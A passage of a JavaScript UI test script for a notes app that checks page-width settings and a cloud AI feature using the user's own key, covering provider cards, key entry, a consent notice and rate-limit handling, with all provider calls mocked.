      Object.assign(PAR.tb, { pos: 'top', width: 'fit', hide: 'off' }); AIC.open = false;
      set({ view: 'notes', modal: null, inspector: 'shown', font: 'opendyslexic', textsize: 'm' });
      if (CF_DEF.width !== 100) pb('Wide is the default', `CF_DEF ${CF_DEF.width}`);
      const geo = () => { const view = app.querySelector('.view--note'), vi = view?.querySelector('.view-inner'), tb = vi?.querySelector(':scope > .ed-toolbar'), d = vi?.querySelector('.doc'), k = parZoom();
        if (!vi) return null; const ir = vi.getBoundingClientRect(), tr = tb?.getBoundingClientRect(), vr = view.getBoundingClientRect();
        let ch = 0; if (d) { const pr = document.createElement('span'); pr.textContent = '0'.repeat(100); pr.style.cssText = 'position:absolute;visibility:hidden;white-space:nowrap'; d.appendChild(pr); ch = pr.getBoundingClientRect().width / k / 100; pr.remove(); }
        const pad = 16, edge = tr ? Math.min(tr.left - vr.left, vr.right - tr.right) / k : 0;
        return { col: Math.round(ir.width / k), area: view.clientWidth, ch: +ch.toFixed(2), off: tr ? +(Math.abs((tr.left + tr.right) / 2 - (ir.left + ir.right) / 2) / k).toFixed(1) : null, atEdge: tr ? edge <= pad + 1 : false, fit: tb?.dataset.fit }; };
      for (const sc of ['1366x768', '1920x1080', '3440x1440']) {
        set({ screen: sc }); const row = P.cols[sc] = {};
        renderAll(); await tick(2); app.style.setProperty('--note-col', 'clamp(560px, 74cqi, 1100px)'); row.old = geo()?.col; app.style.removeProperty('--note-col');   // the old default, measured without a redraw (a draw sets the column again)
        for (const [v, l] of CF_PRESETS.width) { S.a11y.width = v; applyComfort(); renderAll(); await tick(2); const g = geo(); row[l] = g; measure(`Build N QC 89 ${sc} ${l}`);
          if (!g) { pb('the note column is drawn', `${sc} ${l}`); continue; }
          if (g.off > 1.5 && !g.atEdge) pb('the toolbar is centred on the text column', `${sc} ${l}: ${g.off}px off (${g.fit})`); }
        const c = l => row[l]?.col || 0, area = row.Full?.area || 0, ch = row.Narrow?.ch || 10;
        row.sum = `old ${row.old} · ${CF_PRESETS.width.map(([, l]) => `${l} ${c(l)}`).join(' · ')} of ${area} · ch ${ch}`;
        if (!(c('Narrow') < c('Comfortable') && c('Comfortable') <= c('Wide') && c('Wide') <= c('Full'))) pb('each choice is wider than the one before', `${sc}: ${row.sum}`);
        if (c('Narrow') > 65 * ch + 64 || c('Comfortable') > 80 * ch + 64) pb('Narrow and Comfortable are line lengths (65, 80 characters)', `${sc}: ${row.sum}`);
        if (c('Full') < area - 2 * 48) pb('Full is the note area', `${sc}: ${row.sum}`);
        if (c('Wide') < row.old || sc !== '1366x768' && c('Wide') <= row.old) pb('Wide (the default) is wider than the old column', `${sc}: ${row.sum}`);
        if (c('Wide') > 1320 + 64 || sc === '3440x1440' && c('Wide') > c('Full') - 400) pb('Wide is never edge to edge on a wide screen', `${sc}: ${row.sum}`); }
      app.style.removeProperty('--note-col'); S.a11y.width = 100; applyComfort();
      // Settings → Editor: Page width first, the same four choices, the one setting
      S.setSec = 'editor'; set({ screen: '1920x1080', modal: 'settings' }); const pane = app.querySelector('.settings-pane'), first = pane?.querySelector('.set-row');
      const opts = [...(pane?.querySelectorAll('[data-act="pw-set"]') || [])].map(b => `${b.textContent}${b.getAttribute('aria-pressed') === 'true' ? '*' : ''}`).join('|');
      P.editor = `first "${first?.querySelector('.set-label')?.textContent}" · ${opts}`;
      if (first?.querySelector('.set-label')?.textContent !== 'Page width' || opts !== 'Narrow|Comfortable|Wide*|Full') pb('Settings → Editor: Page width, first, Wide picked', P.editor);
      pane.querySelector('[data-act="pw-set"][data-v="80"]').click(); await tick();
      if (S.a11y.width !== 80 || !/Page width: Comfortable/.test(S.status || '')) pb('picking a width in Settings sets it', `${S.a11y.width} · ${S.status}`);
      set({ modal: null }); S.setSec = 'appearance';
      // the note's ⋮ More: the four choices, the current one ticked; a pick closes the menu
      app.querySelector('.app-header [data-act="menu"]')?.click(); await tick();
      const items = [...app.querySelectorAll('.app-header .menu [data-act="pw-set"]')];
      P.menu = items.map(b => `${b.textContent.trim()}${b.getAttribute('aria-checked') === 'true' ? '*' : ''}`).join('|') + ` · role ${items[0]?.getAttribute('role')}`;
      if (P.menu !== 'Narrow|Comfortable*|Wide|Full · role menuitemradio') pb('⋮ More: Page width, the current one ticked', P.menu);
      items.find(b => b.dataset.v === '120')?.click(); await tick();
      P.pick = `${S.a11y.width} · menu ${S.menu} · "${S.status}" · --note-col ${app.style.getPropertyValue('--note-col')}`;
      if (S.a11y.width !== 120 || S.menu || !/Page width: Full/.test(S.status || '') || app.style.getPropertyValue('--note-col') !== 'none') pb('a pick in ⋮ More sets the width and closes the menu', P.pick);
      S.a11y.width = was; Object.assign(PAR.tb, wasTb); applyComfort(); set({ modal: null, screen: '1920x1080' }); }
    // 4b · R56: AI in the cloud with your own key. Every company is faked (no network call): Settings → AI models' cards, Get a
    //      free key, the first-use notice (Not now, Esc, Use Groq), who answered, where the next question goes, every model menu,
    //      the free limit (429) with Use this PC and Use another key, and the notice before a summary too
    if (await cloudOk('R56')) { const R = N.r56 = {}, rb = (k, v) => bad('R56 ' + k, v);
      await CLOUD.ready;
      const cloudSt = (keys = [], o = {}) => { aiDemo(o.state || 'ready'); cloudDemoFill(AI.st);
        AI.st.cloud.forEach(p => Object.assign(p, { has_key: keys.includes(p.id), masked: keys.includes(p.id) ? 'good…1234' : '', seen: (o.seen || []).includes(p.id) ? '2026-10-19' : '', used: (o.used || []).includes(p.id) }));
        for (const [job, pid] of Object.entries(o.jobs || {})) { const p = AI.st.cloud.find(x => x.id === pid), seen = (o.seen || []).includes(pid);
          AI.st.route[job] = o.auto ? 'auto' : 'cloud:' + pid; AI.st.routes[job] = { kind: 'cloud', prov: pid, model: p.model, name: p.model_name, svc: p.name, label: `${p.model_name} · ${p.name} · cloud`, key: 'cloud:' + pid, ready: seen, seen, has_key: true, auto: !!o.auto, free: p.group === 'free' }; }
        renderAll(); };
      const typeAsk = async (q) => { const ta = app.querySelector('#aic-in'); ta.value = q; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); };
      const job = steps => { let i = 0; return { ai_job: () => ({ status: 'success', ...steps[Math.min(i++, steps.length - 1)] }) }; };
      const names = calls => calls.map(c => c[0]);
      // Settings → AI models, no keys: a card per company, free ones first; the facts, two links and the date; Test and Remove wait
      set({ screen: '1920x1080', view: 'notes', modal: null }); cloudSt(); S.setSec = 'ai'; AIS.tab = 'cloud'; set({ modal: 'settings' });
      const cards = [...app.querySelectorAll('[data-cl-card]')], groups = [...app.querySelectorAll('.cl-group')].map(g => g.textContent);
      R.cards = `${cards.map(c => c.dataset.clCard).join(' ')} · ${groups.join('/')} · facts ${cards.map(c => c.querySelectorAll('.cl-fact').length).join('')} · links ${cards.map(c => c.querySelectorAll('.cl-links .cl-link').length).join('')} · waiting ${cards.filter(c => c.querySelector('[data-act="cl-test"]')?.getAttribute('aria-disabled') === 'true' && c.querySelector('[data-act="cl-remove"]')?.getAttribute('aria-disabled') === 'true').length}`;
      if (cards.map(c => c.dataset.clCard).join(' ') !== 'groq gemini openrouter cloudflare cerebras hf anthropic openai' || groups.slice(0, 2).join('/') !== 'Free to start/Paid' || cards.some(c => c.querySelectorAll('.cl-fact').length !== 3 || c.querySelectorAll('.cl-links .cl-link').length !== 2 || !/Checked \d+ \w+ 20\d\d/.test(c.querySelector('.cl-checked')?.textContent || ''))
        || cards.some(c => c.querySelector('[data-act="cl-test"]')?.getAttribute('aria-disabled') !== 'true')) rb('a card per company: who, what is sent, kept or trained on, two links, the date; Test and Remove wait for a key', R.cards);
      if (!/Suggested/.test(cards[0]?.textContent) || cards.slice(1).some(c => /Suggested/.test(c.querySelector('.cl-head').textContent))) rb('Groq is the one suggested', '');
      const onTab = t => { AIS.tab = t; renderAll(); return app.querySelector('.settings-pane'); };   // four tabs (feedback: "ai models - four tabs")
      const allText = ['overview', 'pc', 'cloud', 'jobs'].map(t => onTab(t).textContent).join(' ');
      onTab('pc'); const others = app.querySelector('.ai-others'), otherRows = others ? [...others.querySelectorAll('.provider')].filter(x => /Groq|Gemini|OpenAI|Anthropic/.test(x.textContent)).length : -1, gets = [...(others?.querySelectorAll('.cl-get .cl-link') || [])].map(x => x.textContent).join('|');
      onTab('jobs'); const cloudOpts = [...app.querySelectorAll('[data-act="ai-route"] option')].filter(o => /cloud/i.test(o.textContent)).length;
      const pane = onTab('cloud');
      R.pane = `coming soon ${/Coming soon|coming soon/.test(allText.replace(/Offline fallback\s*Coming soon/, ''))} · cloud rows in Other ways ${otherRows} · get "${gets}" · options ${cloudOpts}`;
      if (/coming soon true/.test(R.pane) || !/rows in Other ways 0/.test(R.pane) || !/get "Get Ollama\|Get LM Studio"/.test(R.pane) || !/options 0$/.test(R.pane)) rb('no Coming soon for the cloud; Ollama and LM Studio keep their row, with Get links', R.pane);
      const order = [...app.querySelectorAll('.ais-tab')].map(t => t.dataset.v).join(' '); if (order !== 'overview pc cloud jobs') rb('the four tabs, the cloud before the jobs', order);
      // the links open in the default browser (open_external), only the company's own
      // a guard, not a throw: in file mode without --allow-file-access-from-files, cloud_providers.json can't load and no card is drawn
      const gLink = app.querySelector('[data-cl-card="groq"] .cl-links [data-act="cl-link"]'); if (!gLink) rb('the cloud cards are drawn (file mode needs --allow-file-access-from-files for cloud_providers.json)', `cloud data ${CLOUD.data ? 'loaded' : 'not loaded'}`);
      let calls = await withApi({}, async () => { gLink?.click(); onTab('pc'); app.querySelector('.ai-others .cl-get [data-act="cl-link"]')?.click(); await tick(); });
      R.links = calls.map(c => `${c[0]} ${c[1][0]}`).join(' · ');
      if (R.links !== 'open_external https://console.groq.com/docs/your-data · open_external https://ollama.com/download/windows') rb('the links open in your browser', R.links);
      onTab('cloud');
      if ([...pane.querySelectorAll('[data-act="cl-link"]')].some(b => !/^https:\/\//.test(b.dataset.v))) rb('every link is https', '');
      // Get a free key: three steps in the card; a password box with Show; Test and save; a refused key; then a key that works
      app.querySelector('[data-cl-card="groq"] [data-act="cl-add"]').click(); await tick();
      let walk = app.querySelector('[data-cl-walk="groq"]'), inp = walk?.querySelector('[data-cl-key="groq"]');
      R.walk = `steps ${walk?.querySelectorAll('.cl-steps > li').length} · focus "${document.activeElement?.textContent.trim()}" · ${inp?.type} · placeholder "${inp?.placeholder}" · foot ${[...(walk?.querySelectorAll('.cl-walk-foot .btn') || [])].map(b => b.textContent).join('|')}`;
      if (walk?.querySelectorAll('.cl-steps > li').length !== 3 || !/Open Groq’s key page/.test(document.activeElement?.textContent || '') || inp?.type !== 'password' || [...walk.querySelectorAll('.cl-walk-foot .btn')].map(b => b.textContent).join('|') !== 'Cancel|Test and save') rb('Get a free key: three steps, the key page first, a password box', R.walk);
      walk.querySelector('[data-act="cl-eye"]').click(); await tick(); if (app.querySelector('[data-cl-key="groq"]')?.type !== 'text') rb('Show the key', '');
      const fakeKey = { ai_cloud_key: (pid, key) => /^good/.test(key) ? (Object.assign(AI.st.cloud.find(p => p.id === pid), { has_key: true, masked: 'good…1234' }), { status: 'success', ok: true, secs: 0.6, limit: false, message: 'Groq answered in 0.6 s. The key is saved in Windows Credential Manager.' }) : { status: 'success', ok: false, secs: 0, limit: false, message: 'Groq didn’t accept this key. Copy it again from its key page.' } };
      calls = await withApi(fakeKey, async () => { inp = app.querySelector('[data-cl-key="groq"]'); inp.value = 'wrong-key-123'; inp.dispatchEvent(new Event('input', { bubbles: true })); app.querySelector('[data-act="cl-save"]').click(); await until(() => app.querySelector('.cl-res')); });
      R.bad = `${names(calls)} · "${app.querySelector('.cl-res')?.textContent}" role ${app.querySelector('.cl-res')?.getAttribute('role')} · focus ${document.activeElement?.dataset.clKey}`;
      if (calls[0]?.[1].join() !== 'groq,wrong-key-123,' || !app.querySelector('.cl-res.is-bad[role="alert"]') || document.activeElement?.dataset.clKey !== 'groq') rb('a refused key says so, and the key box has the focus again', R.bad);
      calls = await withApi(fakeKey, async () => { inp = app.querySelector('[data-cl-key="groq"]'); inp.value = ' good-key-groq-1234 '; inp.dispatchEvent(new Event('input', { bubbles: true })); inp.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); await until(() => app.querySelector('.cl-res.is-ok')); });
      R.ok = `${calls[0]?.[1][1]} · "${app.querySelector('.cl-res')?.textContent}" · focus "${document.activeElement?.textContent}" · kept in the page ${!!CLOUD.val.groq}`;
      if (calls[0]?.[1][1] !== 'good-key-groq-1234' || !app.querySelector('.cl-res.is-ok[role="status"]') || document.activeElement?.dataset.act !== 'cl-done' || CLOUD.val.groq) rb('Enter tests and saves; the key works: Done', R.ok);
      app.querySelector('[data-act="cl-done"]').click(); await tick();
      const g0 = app.querySelector('[data-cl-card="groq"]'); R.saved = `${g0?.querySelector('.cl-val')?.textContent} · Test ${g0?.querySelector('[data-act="cl-test"]')?.getAttribute('aria-disabled')} · focus ${document.activeElement?.dataset.act}`;
      if (!/^Key saved · good…1234/.test(g0?.querySelector('.cl-val')?.textContent || '') || g0.querySelector('[data-act="cl-test"]').getAttribute('aria-disabled') === 'true' || document.activeElement?.dataset.act !== 'cl-add') rb('a saved key: shown masked; Test and Remove work', R.saved);
      app.querySelector('[data-act="cl-add"][data-v="cloudflare"]').click(); await tick();
      if (!app.querySelector('[data-cl-walk="cloudflare"] [data-cl-key="cloudflare:acct"]')) rb('Cloudflare asks for the Account ID too', '');
      app.querySelector('[data-act="cl-cancel"]').click(); await tick();
      // every model menu lists the companies you have a key for
      cloudSt(['groq', 'gemini']); S.setSec = 'ai'; AIS.tab = 'jobs'; set({ modal: 'settings' });
      const opts = [...app.querySelectorAll('[data-act="ai-route"][data-k="qa"] option')].map(o => o.value);
      R.route = opts.join(' '); if (!opts.includes('cloud:groq') || !opts.includes('cloud:gemini') || opts.includes('cloud:openai')) rb('Settings: each job can pick a company you have a key for', R.route);
      AIS.tab = 'cloud'; renderAll(); calls = await withApi({ ai_cloud_remove: () => ({ status: 'success' }) }, async () => { app.querySelector('[data-act="cl-remove"][data-v="gemini"]').click(); await until(() => /removed/.test(S.status || '')); });
      if (calls[0]?.[0] !== 'ai_cloud_remove' || calls[0][1][0] !== 'gemini' || !/Gemini’s key is deleted from Windows Credential Manager/.test(S.status)) rb('Delete key takes the key out of Credential Manager (QC 88: a delete says Delete)', `${names(calls)} · ${S.status}`);
      app.querySelector('[data-cl-card="openai"]')?.scrollIntoView({ block: 'center' }); inWin(app.querySelector('[data-cl-card="openai"]'), '1920', 'a cloud card'); measure('Build N R56 settings 1920');
      set({ modal: null }); S.setSec = 'appearance';
      // the first-use notice: Ask goes to Groq (Automatic, a slow PC); nothing is sent before the answer
      reset(); cloudSt(['groq', 'gemini'], { state: 'nogpu', auto: true, jobs: { qa: 'groq', summary: 'groq' } }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      const ctl = app.querySelector('[data-aic-opener="opts"]');
      R.next = `"${ctl?.textContent.trim()}" · ${ctl?.dataset.clNext} · icon ${ctl?.querySelectorAll('svg').length} · "${ctl?.getAttribute('aria-label')}"`;
      if (!/^This note · GPT-OSS 20B · Groq/.test(ctl?.textContent.trim() || '') || ctl.dataset.clNext !== 'cloud' || !/Automatic: your next question goes to GPT-OSS 20B on Groq, in the cloud/.test(ctl.getAttribute('aria-label'))) rb('the Ask control says where the next question goes: Groq · cloud', R.next);
      ctl.click(); await tick(); const menu = app.querySelector('[data-aic-menu]');
      R.menu = [...(menu?.querySelectorAll('[data-act="aic-model"]') || [])].map(b => `${(b.querySelector('.cl-mname') || b.querySelector('.truncate'))?.textContent}=${b.querySelector('.aic-where')?.textContent}`).join(' | ');
      if (!/^Automatic=GPT-OSS 20B · Groq/.test(R.menu) || !/GPT-OSS 20B=/.test(R.menu) || !/Gemini 3\.1 Flash-Lite=/.test(R.menu) || [...menu.querySelectorAll('.cl-ghead > span:first-child')].map(e => e.textContent).join('|') !== 'On this PC|Groq|Google Gemini') rb('the model menu: Automatic says GPT-OSS 20B · Groq; each model, by company', R.menu);
      AIC.menu = null; renderAll();
      const q = 'When is the roadmap due?', nn = note(), dkey = aicKey(nn);
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'r1' }), ...job([{ state: 'done', result: { answer: 'Friday.', by: 'GPT-OSS 20B' } }]) }, async () => {
        await typeAsk(q); await until(() => S.modal === 'cl-notice'); });
      const dlgEl = app.querySelector('[data-dlg="cl-notice"]');
      R.notice = `${S.modal} · "${dlgEl?.querySelector('.modal-title')?.textContent}" · question ${dlgEl?.textContent.includes(q)} · note ${dlgEl?.textContent.includes(nn.title)} · facts ${dlgEl?.querySelectorAll('.cl-fact').length} · links ${dlgEl?.querySelectorAll('.cl-link').length} · boxes ${dlgEl?.querySelectorAll('input').length} · focus "${document.activeElement?.textContent}" · buttons ${[...(dlgEl?.querySelectorAll('.modal-foot .btn') || [])].map(b => b.textContent).join('|')} · sent ${names(calls)}`;
      if (S.modal !== 'cl-notice' || dlgEl?.querySelector('.modal-title')?.textContent !== 'Send this to Groq?' || !dlgEl.textContent.includes(q) || !dlgEl.textContent.includes(nn.title) || dlgEl.querySelectorAll('.cl-fact').length !== 3 || dlgEl.querySelectorAll('input').length
        || document.activeElement?.textContent !== 'Not now' || [...dlgEl.querySelectorAll('.modal-foot .btn')].map(b => b.textContent).join('|') !== 'Not now|Use Groq' || calls.length) rb('the first-use notice: the real question and note, the facts, Not now / Use Groq, nothing to tick, nothing sent', R.notice);
      inWin(dlgEl, '1920', 'the first-use notice');
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick(6);
      R.esc = `${S.modal} · draft "${AIC.drafts[dkey]}" · turns ${aicChat(dkey).turns.length} · "${S.status}"`;
      if (S.modal || AIC.drafts[dkey] !== q || aicChat(dkey).turns.length || !/Nothing was sent/.test(S.status || '')) rb('Esc is Not now: nothing sent, the question still in the box', R.esc);
      calls = await withApi({ ai_cloud_yes: () => ({ status: 'success', seen: '2026-10-19' }), ai_ask: () => ({ status: 'success', job: 'r2' }), ...job([{ state: 'done', result: { answer: 'Friday.', by: 'GPT-OSS 20B' } }]) }, async () => {
        app.querySelector('[data-act="aic-send"]').click(); await until(() => S.modal === 'cl-notice'); app.querySelector('[data-dlg="cl-notice"] [data-act="cl-use"]').click(); await until(() => !AIC.busy && aicChat(dkey).turns.length); await tick(4); });
      const by = app.querySelector('.aic-turn.is-newest .cl-by');
      R.yes = `${names(calls).join(',')} · by "${by?.textContent.trim()}" ${by?.dataset.clBy} icon ${!!by?.querySelector('svg')}`;
      if (names(calls).join(',') !== 'ai_cloud_yes,ai_ask,ai_job' || calls[0][1].join() !== 'groq,true' || by?.textContent.trim().replace(/ · \d+ s$/, '') !== 'GPT-OSS 20B · Groq · cloud' || by.dataset.clBy !== 'cloud' || !by.querySelector('svg')) rb('Use Groq: the yes is saved, then it is sent; the answer says Groq · cloud', R.yes);
      // a second question to Groq: no notice
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'r3' }), ...job([{ state: 'done', result: { answer: 'Maya.', by: 'GPT-OSS 20B' } }]) }, async () => { await typeAsk('Who owns the audit?'); await until(() => !AIC.busy && aicChat(dkey).turns.length === 2); });
      if (S.modal || names(calls)[0] !== 'ai_ask') rb('once said yes, no notice again', `${S.modal} ${names(calls)}`);
      // the free limit (429): one message, nothing sent anywhere else; Use another key lists the others; Use this PC asks here
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'r4' }), ...job([{ state: 'error', message: 'GPT-OSS 20B on Groq: today’s free limit is used up.', limit: 'groq', limit_key: 'cloud:groq' }]) }, async () => { await typeAsk('And the budget?'); await until(() => !AIC.busy && app.querySelector('.cl-limit')); });
      const lim = app.querySelector('.cl-limit');
      R.limit = `"${lim?.querySelector('.aic-err-text')?.textContent.trim()}" · ${[...(lim?.querySelectorAll('.aic-err-acts .btn') || [])].map(b => b.textContent.trim()).join('|')} · sent ${names(calls).filter(x => x === 'ai_ask').length}`;
      if (!/^GPT-OSS 20B on Groq: today’s free limit is used up\. Nothing was sent anywhere else\. It comes back on Groq’s own schedule: see its limits/.test(lim?.querySelector('.aic-err-text')?.textContent.trim() || '') || ![...lim.querySelectorAll('.aic-err-acts .btn')].map(b => b.textContent.trim()).join('|').endsWith('Use this PC|Use another key') || names(calls).filter(x => x === 'ai_ask').length !== 1) rb('429: the limit said plainly, two ways on, nothing sent elsewhere', R.limit);
      lim.querySelector('[data-act="cl-alt"]').click(); await tick();
      R.alts = [...app.querySelectorAll('.cl-alts .btn')].map(b => b.textContent.trim()).join('|'); if (R.alts !== 'Google Gemini|Add a key…') rb('Use another key: the other keys, and Add a key…', R.alts);
      calls = await withApi({ ai_use_local: () => { AI.st.route.qa = 'local:qwen35-2b'; AI.st.routes.qa = { kind: 'local', model: 'qwen35-2b', name: 'Qwen3.5 2B', label: 'On this PC · Qwen3.5 2B', ready: true }; return { status: 'success', choice: 'local:qwen35-2b', name: 'Qwen3.5 2B', back: 'auto' }; },
        ai_ask: () => ({ status: 'success', job: 'r5' }), ...job([{ state: 'done', result: { answer: 'No budget yet.', by: 'Qwen3.5 2B' } }]) }, async () => { app.querySelector('.cl-limit [data-act="cl-uselocal"]').click(); await until(() => !AIC.busy && !app.querySelector('.cl-limit') && app.querySelector('.aic-turn.is-newest .cl-by')); });
      const by2 = app.querySelector('.aic-turn.is-newest .cl-by'), ctl2 = app.querySelector('[data-aic-opener="opts"]');
      R.local = `${names(calls).join(',')} · by "${by2?.textContent.trim()}" ${by2?.dataset.clBy} · control "${ctl2?.textContent.trim()}" · "${S.toast}"`;
      if (names(calls).slice(0, 2).join(',') !== 'ai_use_local,ai_ask' || calls[0][1][0] !== 'qa' || by2?.dataset.clBy !== 'pc' || !/This note · Qwen3\.5 2B · this PC/.test(ctl2?.textContent.trim() || '') || !/^Qwen3\.5 2B · this PC · \d+ s$/.test(by2?.textContent.trim() || '') || !/until tomorrow, then goes back to Automatic/.test(S.toast || '')) rb('Use this PC: asked again here, until tomorrow', R.local);
      // a summary waits for the notice too
      cloudSt(['gemini'], { state: 'nogpu', jobs: { summary: 'gemini' } }); AIN.sum.open = false; renderAll();
      calls = await withApi({ ai_summary: () => ({ status: 'success', job: 'r6' }) }, async () => { app.querySelector('[data-act="ain-sum"]').click(); await until(() => S.modal === 'cl-notice');
        R.sumNotice = `"${app.querySelector('[data-dlg="cl-notice"] .modal-title')?.textContent}" · "${app.querySelector('[data-dlg="cl-notice"] .cl-fact:nth-child(2) dd')?.textContent}"`;
        app.querySelector('[data-dlg="cl-notice"] .modal-foot [data-act="cl-notnow"]').click(); await tick(6); });
      if (!/Send this to Google Gemini\?/.test(R.sumNotice) || !/to summarise it/.test(R.sumNotice) || calls.some(c => c[0] === 'ai_summary') || S.modal) rb('a summary asks first too; Not now sends nothing', `${R.sumNotice} · ${names(calls)}`);
      // the narrow window: the notice and a card stay inside it
      set({ screen: '1366x768' }); cloudSt(['groq'], { jobs: { qa: 'groq' } }); S.setSec = 'ai'; AIS.tab = 'cloud'; set({ modal: 'settings' }); app.querySelector('[data-cl-card="groq"]')?.scrollIntoView({ block: 'center' }); inWin(app.querySelector('[data-cl-card="groq"]'), '1366', 'a cloud card');
      const sc = app.querySelector('.settings-pane'); if (sc && sc.scrollWidth > sc.clientWidth + 1) rb('the AI page scrolls sideways at 1366', `${sc.scrollWidth} > ${sc.clientWidth}`); measure('Build N R56 settings 1366');
      set({ modal: null, screen: '1920x1080' }); S.setSec = 'appearance';
      Object.assign(CLOUD, { add: null, val: {}, show: {}, res: {}, busy: null, notice: null, alt: null, limits: {} }); reset(); aiDemo('ready'); renderAll(); }
    // 4d · QC 91: every model each company lists, grouped by company with the models on this PC (R60, "by service"): Recommended
    //      marked, image-capable ones marked, a search box when it's long, the list's line ("listing sends only your key"),
    //      a pick sets the job's model, the by line names the model; Settings lists a company's models with Refresh
    if (await cloudOk('QC 91')) { const Q = N.qc91 = {}, qb = (k, v) => bad('QC 91 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      await CLOUD.ready; reset(); aiDemo('ready'); cloudDemoFill(AI.st);
      const LISTS = { groq: [['openai/gpt-oss-20b', 'GPT-OSS 20B', '131K', false, true], ['llama-3.3-70b-versatile', 'Llama 3.3 70B', '131K'], ['meta-llama/llama-4-scout-17b-16e-instruct', 'Llama 4 Scout 17B', '131K', true], ['qwen/qwen3-32b', 'Qwen3 32B', '131K']],
        gemini: [['gemini-3.1-flash-lite', 'Gemini 3.1 Flash-Lite', '1M', true, true], ['gemini-3.5-flash', 'Gemini 3.5 Flash', '1M', true]] };
      AI.st.cloud.forEach(p => { const l = LISTS[p.id]; if (!l) return; Object.assign(p, { has_key: true, masked: 'good…1234', seen: '2026-10-19', list_state: 'saved', listed_at: '2026-10-19T10:42',
        models: l.map(([id, name, ctx, vision, rec]) => ({ id, name, ctx, vision: !!vision, rec: !!rec, used: false })) }); });
      AI.st.route.qa = 'auto'; AI.st.routes.qa = { kind: 'cloud', prov: 'groq', model: 'openai/gpt-oss-20b', name: 'GPT-OSS 20B', svc: 'Groq', label: 'GPT-OSS 20B · Groq · cloud', key: 'cloud:groq', ready: true, seen: true, has_key: true, auto: true, free: true };
      set({ screen: '1366x768', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      app.querySelector('[data-aic-opener="opts"]')?.click(); await tick(); const menu = app.querySelector('[data-aic-menu]');
      const heads = [...(menu?.querySelectorAll('.cl-ghead > span:first-child') || [])].map(txt), rows = [...(menu?.querySelectorAll('.cl-mi') || [])];
      Q.menu = `heads ${heads.join(' / ')} · ${rows.length} rows · Recommended ${menu?.querySelectorAll('.cl-rec').length} · images ${menu?.querySelectorAll('.cl-vis').length} · search ${!!menu?.querySelector('[data-cl-q]')} · foot "${txt(menu?.querySelector('.cl-mfoot'))}"`;
      if (heads.join('|') !== 'On this PC|Groq|Google Gemini' || rows.filter(r => r.dataset.v.startsWith('cloud:')).length !== 6 || menu.querySelectorAll('.cl-rec').length !== 2 || menu.querySelectorAll('.cl-vis').length !== 3
        || !menu.querySelector('[data-cl-q]') || !/listing sends only your key, never your notes/.test(txt(menu.querySelector('.cl-mfoot')))) qb('the Ask menu: every model, by company, Recommended and image models marked, the list line', Q.menu);
      inWin(menu, '1366', 'the model menu');
      rows.forEach(b => { const br = b.getBoundingClientRect(), mr = menu.getBoundingClientRect(); if (b.scrollWidth > b.clientWidth + 1 || br.right > mr.right + 0.5 || [...b.children].some(c => c.getBoundingClientRect().right > br.right + 0.5)) qb('no row runs out of room', `${txt(b).slice(0, 30)}: ${Math.round(br.right)} in ${Math.round(mr.right)}`); });
      const q = menu.querySelector('[data-cl-q]'); q.value = 'llama'; q.dispatchEvent(new Event('input', { bubbles: true }));
      const shown = [...menu.querySelectorAll('.cl-mi')].filter(r => !r.hidden && !r.closest('[hidden]')).map(r => r.dataset.v);
      q.value = 'zzz'; q.dispatchEvent(new Event('input', { bubbles: true })); const none = !menu.querySelector('[data-cl-none]').hidden;
      Q.search = `"llama": ${shown.join(', ')} · nothing for zzz: ${none}`;
      if (shown.filter(k => k.startsWith('cloud:')).join('|') !== 'cloud:groq:llama-3.3-70b-versatile|cloud:groq:meta-llama/llama-4-scout-17b-16e-instruct' || !shown.includes('ollama') || !none) qb('the search box finds models', Q.search);
      q.value = ''; q.dispatchEvent(new Event('input', { bubbles: true }));
      let calls = await withApi({ ai_set_route: () => ({ status: 'success' }) }, async () => { menu.querySelector('[data-act="aic-model"][data-v="cloud:groq:llama-3.3-70b-versatile"]').click(); await tick(4); });
      const sr = calls.find(c => c[0] === 'ai_set_route'); Q.pick = sr ? sr[1].join(' → ') : 'none';
      if (Q.pick !== 'qa → cloud:groq:llama-3.3-70b-versatile') qb('a pick sets Ask’s model', Q.pick);
      // the by line names the model and its company
      AI.st.route.qa = 'cloud:groq:llama-3.3-70b-versatile'; AI.st.routes.qa = { ...AI.st.routes.qa, model: 'llama-3.3-70b-versatile', name: 'Llama 3.3 70B', label: 'Llama 3.3 70B · Groq · cloud', key: 'cloud:groq:llama-3.3-70b-versatile', auto: false }; AIC.menu = null; renderAll();
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'm1' }), ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'Friday.', by: 'Llama 3.3 70B' } }) }, async () => {
        const ta = app.querySelector('#aic-in'); ta.value = 'When is it due?'; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); await until(() => !AIC.busy && app.querySelector('.aic-turn.is-newest .cl-by')); });
      Q.by = txt(app.querySelector('.aic-turn.is-newest .cl-by')).replace(/ · \d+ s$/, ''); Q.control = txt(app.querySelector('[data-aic-opener="opts"]'));
      if (Q.by !== 'Llama 3.3 70B · Groq · cloud' || !/^This note · Llama 3\.3 70B · Groq/.test(Q.control)) qb('the by line and the Ask control name the model and its company', `${Q.by} · ${Q.control}`);
      // Settings: Groq's models, three then all four, with the list's state; Refresh asks again (only the key)
      AIC.open = false; S.setSec = 'ai'; AIS.tab = 'cloud'; set({ modal: 'settings' }); const cm = () => app.querySelector('[data-cl-cm="groq"]');
      Q.settings = `${cm()?.querySelectorAll('.cl-cm-row').length} rows · "${txt(cm()?.querySelector('.cl-cm-state'))}" · "${txt(cm()?.querySelector('.cl-cm-more'))}"`;
      if (cm()?.querySelectorAll('.cl-cm-row').length !== 3 || !/only your key was sent/.test(txt(cm()?.querySelector('.cl-cm-state'))) || !/All 4 models/.test(txt(cm()?.querySelector('.cl-cm-more')))) qb('Settings: a company’s models, three then All', Q.settings);
